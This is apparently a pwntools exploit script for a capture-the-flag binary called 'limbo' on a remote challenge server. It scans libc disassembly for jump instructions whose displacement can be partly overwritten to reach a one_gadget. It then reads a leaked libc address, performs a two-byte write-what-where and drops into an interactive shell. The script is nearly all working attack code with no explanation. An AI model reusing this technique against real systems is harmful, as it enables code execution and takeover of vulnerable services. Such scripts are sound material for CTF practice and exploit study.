#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./limbo')
libc = ELF('./libc-2.35.so')

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

one_gadgets = [ 330295, 330307, 330328, 330336, 527427, 527440, 527445, 527450, 965873, 965877, 965880, 965970, 966063, 966067, 966071, 1104834, 1104842, 1104847, 1104857]

noaslrbase = 0x007ffff7d8f000

functions = [
b'__printf',
b'__vfprintf_internal',
b'buffered_vfprintf',
b'_itoa_word',
b'__GI__IO_default_xsputn',
b'_IO_new_file_xsputn',
b'_IO_new_file_overflow',
b'_IO_new_do_write',
b'_IO_new_file_write',
b'__GI___libc_write',
b'__GI_exit',
b'__run_exit_handlers',
b'__GI___call_tls_dtors',
b'_dl_fini',
b'___pthread_mutex_lock',
b'_dl_sort_maps',
b'dfs_traversal',
b'___pthread_mutex_unlock',
b'__cxa_finalize',
b'__unregister_atfork',
b'_dl_audit_objclose',
b'_dl_audit_activity_nsid',
b'_IO_cleanup',
b'_IO_flush_all_lockp',
b'__GI___libc_cleanup_push_defer',
b'__GI___libc_cleanup_pop_restore',
b'__GI__exit']

#print(disasm(functions[1]))


with open('libc.asm','r') as file:
    lines = file.readlines()

lines = [ [x.strip() for x in line.strip().split('\t')] for line in lines if line[0:3] == '   ' ]
lines = [ [ int(x[0][:-1],16), [int(i,16) for i in x[1].split(' ')] ] for x in lines ]

opcodes = { noaslrbase+line[0]: line[1] for line in lines }
with open('jmps.txt','r') as file:
    jumps = file.readlines()

jumps = [ int(x.strip().split(' ')[0],0) for x in jumps ]

candidates = { jump: opcodes[jump][-4:] for jump in jumps if jump in opcodes and len(opcodes[jump]) > 4 }

def GetInt(arry):
    unsigned = u32( b"".join([ int.to_bytes(x,1,'little') for x in arry ]) )
    print(f"GetInt: {arry} : {unsigned} - {hex(unsigned)}")
    return unsigned

def Signed(unsigned):
    if unsigned & 0x80000000 > 0:
        unsigned = -0x100000000+unsigned
    return unsigned

hits = []

for jump in jumps:
    if jump in candidates:
        #code = disasm(b"".join([ int.to_bytes(x,1,'little') for x in opcodes[jump]]))
        #print(f"{hex(jump)}: {opcodes[jump]} - {candidates[jump]} - {code} - {GetInt(candidates[jump])}")

        unsignedint = GetInt(candidates[jump])

        base = jump+len(opcodes[jump])
        minjmp = base + Signed( GetInt(candidates[jump]) & 0xffff0000 )
        maxjmp = base + Signed( (GetInt(candidates[jump]) & 0xffff0000) + 0xffff )

        for gadget in one_gadgets:
            gadr = noaslrbase+gadget
            if minjmp <= gadr and gadr <= maxjmp:
                a = [jump+len(opcodes[jump])-4, gadr-minjmp, jump]
                hits.append(a)




print(hits)
#print(len(hits))
for hit in hits:
    # if Signed( GetInt(candidates[hit[2]])) > 0:
    #     continue

    ### FANT DEN!!
    if hit[2] != 0x7ffff7dd4ae6:
        continue

    log.info(f" HIT: {hit}")
    try:
        jump = hit[2]
        code = disasm(b"".join([ int.to_bytes(x,1,'little') for x in opcodes[jump]]))
        print(f"{hex(jump)}: {opcodes[jump]} - {candidates[jump]} - {code} - {GetInt(candidates[jump])}")
        io = start()
        io.recvuntil(b'.text @ [')
        leak = int(io.recvuntil(b'-0x', drop=True),0)
        libcbase = leak - 0x28000

        where = hit[0] - noaslrbase + libcbase
        what = int.to_bytes(hit[1],2,'little')
        io.sendlineafter(b'> ', str(where))
        io.sendlineafter(b'> ', what)

        io.interactive()
        io.close()
    except:
        io.close()
